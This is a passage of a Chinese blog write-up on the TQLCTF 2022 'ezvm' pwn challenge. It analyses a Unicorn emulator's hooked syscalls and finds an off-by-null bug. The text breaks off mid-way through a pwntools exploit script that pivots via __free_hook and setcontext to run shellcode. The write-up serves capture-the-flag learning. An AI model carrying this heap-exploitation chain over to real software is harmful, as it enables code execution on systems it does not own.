@@ -1,0 +1,293 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>TQLCTF2022-ezvm-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="上周末参加了奇安信和 Redbud 一起组织的 TQLCTF，pwn 题的质量挺高，都挺有意思的，我在比赛期间尝试做了 unbelievable_write，e"><meta property="og:image" content><meta property="og:title" content="TQLCTF2022-ezvm-WP"><meta property="og:description" content="上周末参加了奇安信和 Redbud 一起组织的 TQLCTF，pwn 题的质量挺高，都挺有意思的，我在比赛期间尝试做了 unbelievable_write，e"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1594.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-02-21T23:30:52+00:00"><meta property="article:modified_time" content="2022-02-21T23:30:52+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="TQLCTF2022-ezvm-WP"><meta name=twitter:description content="上周末参加了奇安信和 Redbud 一起组织的 TQLCTF，pwn 题的质量挺高，都挺有意思的，我在比赛期间尝试做了 unbelievable_write，e"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>TQLCTF2022-ezvm-WP</h1><div class=meta>Posted on Feb 21, 2022</div></div><section class=body><p>上周末参加了奇安信和 Redbud 一起组织的 TQLCTF，pwn 题的质量挺高，都挺有意思的，我在比赛期间尝试做了 unbelievable_write，ezvm 和 trivm-string 三道题，做出两题。其中 unbelievable_write 是一个传统的堆题，free 掉 tcache_prethread_struct 然后 add 即可控制该结构体实现任意地址分配，分配到 free@got 处修改为别的函数即可避免 free 非法堆块导致报错，然后再分配到 target 处覆写即可获得 flag。很简单，就不写 wp 了。然后 trivm-string 这题，三进制平衡虚拟机，确实很有意思，逆向队友帮忙写了一个反汇编器，可惜分析的稍微有点问题。本来的思路是还原栈帧并理清输入流程找到溢出点，但是由于反汇编错误丢失一些 label，看了一会儿还是放弃了。之后准备学习一下反汇编器开发的技巧，再看看能不能写个该虚拟机的反汇编器。</p><p>ezvm 这道题是个 unicorn 的利用，在比赛中碰到过两次 unicorn 的利用，上一次是 TCTF 的 uc 系列题，当时比赛的时候好像有别的什么事就摸鱼了，赛后复现了一下，写成的 wp 是<a href=https://cjovi.icu/WP/1515.html>TCTF2021-uc_masteeer-WP</a>这篇文章，当时算是入了个门，也可以参考本文了解一下 unicorn 的基本概念。这次比赛又碰到了就做了一下。这道题也算是个入门题，说到底来就是个普通堆利用。从碰到的 unicorn pwn 题来看都是加了个外部功能比如 hook 一个系统调用，然后在这个新功能里面有个洞然后要选手利用，其实就和现在比赛中常见的 kernel module pwn 差不多，不过 unicorn 环境下的 pwn 其实和用户态 pwn 差不多，只是一个宿主机一个客户机可能稍微有点绕，然后就是要手写汇编可能稍微麻烦一点（也可能可以编译生成 payload，不过这里我还是倾向于自己手写，更有安全感）。</p><p>首先拿到 binary，拖到 IDA 里面，会发现调用 uc 相关的函数时原先的枚举量都变成了数字，IDA 提供了数字转枚举转宏的功能，也提供了自动 parse 头文件生成枚举和宏的功能，首先从 unicorn 的 GitHub <a href=https://github.com/unicorn-engine/unicorn/releases/tag/1.0.3>release 页面</a>获取源码，取出其中的头文件，我们需要用的相关定义主要在 <code>unicorn.h</code> 和 <code>x86.h</code> 中，使用 IDA 进行 parse 后，在 local type 中将 parse 出来的定义导入数据库，对着数字按 <code>m</code> 即可转为对应的枚举</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/02/419091227.png alt=设置枚举></p><p>全部转完之后就会好分析很多，然后我们来分析流程，很容易发现 hook 的系统调用提供了四种功能</p><ul><li>eax = 0，read，read 一段<em>宿主机文件</em>的内容并拷贝到客户机内存</li><li>eax = 1，write，拷贝一段客户机内存并 write 到<em>宿主机文件</em>中</li><li>eax = 2，open，打开一个<em>宿主机文件</em>，需要注意的是默认开启宿主机的 stdin，stdout，stderr 三个文件，剩下的文件开启关闭都是程序自己虚拟出来的</li><li>eax = 3，close，关闭一个<em>宿主机文件</em></li></ul><p>刚才也说了，宿主机文件是虚拟的，什么意思呢，以 read 操作为例，可以看到实际调用时是这样实现的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>__int64</span> <span style=color:#007020;font-weight:700>__fastcall</span> <span style=color:#06287e>sub_18FE</span>(<span style=color:#902000>int</span> a1, <span style=color:#007020;font-weight:700>__int64</span> a2, <span style=color:#007020;font-weight:700>__int64</span> a3)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> i; <span style=color:#60a0b0;font-style:italic>// [rsp+2Ch] [rbp-4h]
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> ( i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;=</span> <span style=color:#40a070>15</span>; <span style=color:#666>++</span>i )
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( <span style=color:#666>*</span>((_QWORD <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>unk_5020 <span style=color:#666>+</span> <span style=color:#40a070>9</span> <span style=color:#666>*</span> i) <span style=color:#666>==</span> a1 )
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>return</span> ((<span style=color:#007020;font-weight:700>__int64</span> (<span style=color:#007020;font-weight:700>__fastcall</span> <span style=color:#666>*</span>)(<span style=color:#902000>char</span> <span style=color:#666>*</span>, <span style=color:#007020;font-weight:700>__int64</span>, <span style=color:#007020;font-weight:700>__int64</span>))funcs_1999[<span style=color:#40a070>9</span> <span style=color:#666>*</span> i])((<span style=color:#902000>char</span> <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>unk_5020 <span style=color:#666>+</span> <span style=color:#40a070>72</span> <span style=color:#666>*</span> i, a2, a3);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0xFFFFFFFFLL</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这明显是一个类似于虚表的调用方式，通过一些简单的猜测，我们可以还原出 unk_5020 开始的这一段内存里面存储的结构体结构</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>file</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int64</span> fd;
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> file_name[<span style=color:#40a070>24</span>];
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int64</span> buf;
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int64</span> buf_size;
+</span></span><span style=display:flex><span>  <span style=color:#902000>void</span> <span style=color:#666>*</span>read;
+</span></span><span style=display:flex><span>  <span style=color:#902000>void</span> <span style=color:#666>*</span>write;
+</span></span><span style=display:flex><span>  <span style=color:#902000>void</span> <span style=color:#666>*</span>close;
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>观察 open 操作</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>__int64</span> <span style=color:#007020;font-weight:700>__fastcall</span> <span style=color:#06287e>do_host_open</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>file_name, <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span> buf_size)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span> size; <span style=color:#60a0b0;font-style:italic>// [rsp+0h] [rbp-20h]
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>int</span> i; <span style=color:#60a0b0;font-style:italic>// [rsp+14h] [rbp-Ch]
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>int</span> j; <span style=color:#60a0b0;font-style:italic>// [rsp+14h] [rbp-Ch]
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>file</span> <span style=color:#666>*</span>v6; <span style=color:#60a0b0;font-style:italic>// [rsp+18h] [rbp-8h]
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
+</span></span><span style=display:flex><span>  size <span style=color:#666>=</span> buf_size;
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> ( i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;=</span> <span style=color:#40a070>15</span>; <span style=color:#666>++</span>i )
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( <span style=color:#666>!</span>strcmp(files[i].file_name, file_name) )
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>return</span> files[i].fd;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ( total_files <span style=color:#666>&gt;</span> <span style=color:#40a070>15</span> )
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0xFFFFFFFFLL</span>;
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ( buf_size <span style=color:#666>&gt;</span> <span style=color:#40a070>0x400</span> )
+</span></span><span style=display:flex><span>    size <span style=color:#666>=</span> <span style=color:#40a070>0x400LL</span>;
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> ( j <span style=color:#666>=</span> <span style=color:#40a070>0</span>; j <span style=color:#666>&lt;=</span> <span style=color:#40a070>15</span> <span style=color:#666>&amp;&amp;</span> files[j].file_name[<span style=color:#40a070>0</span>]; <span style=color:#666>++</span>j )
+</span></span><span style=display:flex><span>    ;
+</span></span><span style=display:flex><span>  v6 <span style=color:#666>=</span> <span style=color:#666>&amp;</span>files[j];
+</span></span><span style=display:flex><span>  v6<span style=color:#666>-&gt;</span>buf <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>__int64</span>)malloc(size);
+</span></span><span style=display:flex><span>  strcpy(v6<span style=color:#666>-&gt;</span>file_name, file_name);
+</span></span><span style=display:flex><span>  v6<span style=color:#666>-&gt;</span>read <span style=color:#666>=</span> file_read;
+</span></span><span style=display:flex><span>  v6<span style=color:#666>-&gt;</span>write <span style=color:#666>=</span> file_write;
+</span></span><span style=display:flex><span>  v6<span style=color:#666>-&gt;</span>close <span style=color:#666>=</span> file_close;
+</span></span><span style=display:flex><span>  v6<span style=color:#666>-&gt;</span>fd <span style=color:#666>=</span> j;
+</span></span><span style=display:flex><span>  <span style=color:#666>++</span>total_files;
+</span></span><span style=display:flex><span>  v6<span style=color:#666>-&gt;</span>buf_size <span style=color:#666>=</span> size;
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> v6<span style=color:#666>-&gt;</span>fd;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>分析虚表指针指向的函数就可以理解是如何实现客户机的 read write close 了。审计这个函数也可以发现主要的漏洞点，也就是 strcpy 处 off-by-null，会覆写 <code>file->buf</code> 的最低一位，由此可以实现 chunkoverlapping，之后打 <code>__free_hook</code>，通过 setcontext 栈迁移执行 mprotect ret2shell code 后 orw 即可获取 flag。</p><p>另外还有一个洞就是通过多次 close 一个文件后多次 open 文件可以实现数组越界修改 stderr 指针，但是这里似乎无法通过这种方式完成利用。</p><p>比较麻烦的地方在于堆环境比较乱，但是还比较稳定，所以多调试一下就可以完成堆风水。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>arch <span style=color:#666>=</span> <span style=color:#4070a0>&#34;i386&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./easyvm&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;120.24.82.252&#34;</span>, <span style=color:#40a070>49790</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#4070a0>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>main_arena 0x1ebb70
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>offset to __free_hook +0x2938
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>offset to __realloc_hook +0x2978
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>__free_hook 0x1eeb28
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>__realloc_hook 0x1ebb68
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>heap offset 0x9D0
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>setcontext 0x580DD
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>mprotect 0x11bb00
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>code <span style=color:#666>=</span> <span style=color:#4070a0>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 0x401000;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x80;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 2;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 0x401020;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x400;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 2;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 0x401010;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x80;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 2;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 0x401060;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x400;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 2;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 0x3;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edx, 8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x4010F0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 5;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 3;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 3;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 3;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 0x4;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edx, 8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x4010F8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0x4010F0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, [eax];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    sub ebx, 0x688;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [eax], ebx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 4;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edx, 8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x4010F0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 1;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 0x401040;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x80;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 2;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 0x401050;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x80;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 2;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>code <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0x4010F0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, [eax];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    sub ebx, 0x1ebb68;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [eax], ebx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0x4010F8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, [eax];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    add ebx, 0x90;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [eax], ebx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># set the context or so here</span>
+</span></span><span style=display:flex><span>code <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, 0x401200;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0x4010F0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    add ecx, 0x154930;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax + 4];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx + 4], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, 0x401208;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0x4010F8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax + 4];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx + 4], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, 0x401220;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0x4010F0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    add ecx, 0x580DD;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax + 4];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx + 4], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, 0x4012A0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0x4010F8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax]
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    add ecx, 0x30;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax + 4];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx + 4], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, 0x401268;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0x4010F8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax]
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    sub ecx, 0xf30;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax + 4];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx + 4], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, 0x401270;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, 0x2000;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, 0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx + 4], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, 0x401288;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, 0x7;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, 0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx + 4], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, 0x4012A8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0x4010F0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    add ecx, 0x11bb00;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax + 4];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx + 4], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, 0x401230;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0x4010F8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    add ecx, 0x100;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, [eax + 4];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [ebx + 4], ecx;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ecx, 0x100;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 0x401300;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x402000;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    rep movs byte ptr [edi], [esi];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>code <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 6;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edx, 0x3F8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x401200;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 1;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># set the magic gadget</span>
+</span></span><span style=display:flex><span>code <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 0x4010F0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov ebx, [eax];
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    add ebx, 0x154930;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov [eax], ebx;  
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 5;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edx, 0x8;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x4010F0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 1;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># trigger the gadget</span>
+</span></span><span style=display:flex><span>code <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 6;
